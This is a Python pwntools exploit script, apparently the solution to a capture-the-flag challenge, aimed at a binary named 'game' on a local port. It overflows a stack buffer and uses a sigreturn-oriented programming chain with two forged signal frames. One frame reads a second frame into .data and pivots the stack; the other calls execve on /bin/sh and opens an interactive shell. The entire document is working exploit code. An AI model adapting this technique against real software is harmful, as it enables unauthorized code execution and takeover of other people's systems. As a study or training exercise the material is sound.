from pwn import *

context.arch = "amd64"
elf = ELF('./game')
io = remote('127.0.0.1', 10001)		# io = process('./game')

data_addr = elf.get_section_by_name('.data').header.sh_addr + 0x10
base_addr = data_addr + 0x8			# new stack address

pop_rax_addr = 0x00000000004007b2		# pop rax ; ret
syscall_addr = 0x000000000040077f		# syscall ; ret

# sigreturn syscall
sigreturn  = p64(pop_rax_addr)
sigreturn += p64(constants.SYS_rt_sigreturn)	# 0xf
sigreturn += p64(syscall_addr)

# frame_2: execve to get shell
frame_2 = SigreturnFrame()
frame_2.rax = constants.SYS_execve
frame_2.rdi = data_addr
frame_2.rsi = 0
frame_2.rdx = 0
frame_2.rip = syscall_addr

# frame_1: read frame_2 to .data
frame_1 = SigreturnFrame()
frame_1.rax = constants.SYS_read
frame_1.rdi = constants.STDIN_FILENO
frame_1.rsi = data_addr
frame_1.rdx = len(str(frame_2))
frame_1.rsp = base_addr				# stack pivot
frame_1.rip = syscall_addr

def step_1():
	payload_1  = "A" * (1040 + 8)		# overflow
	payload_1 += sigreturn
	payload_1 += str(frame_1)

	io.sendlineafter("> ", "1")
	io.sendlineafter("> ", "0")
	io.sendlineafter("> ", payload_1)
	io.sendlineafter("> ", "3")

def step_2():
	payload_2  = "/bin/sh\x00"
	payload_2 += sigreturn
	payload_2 += str(frame_2)

	io.sendline(payload_2)
	io.interactive()

if __name__=='__main__':
	step_1()
	step_2()
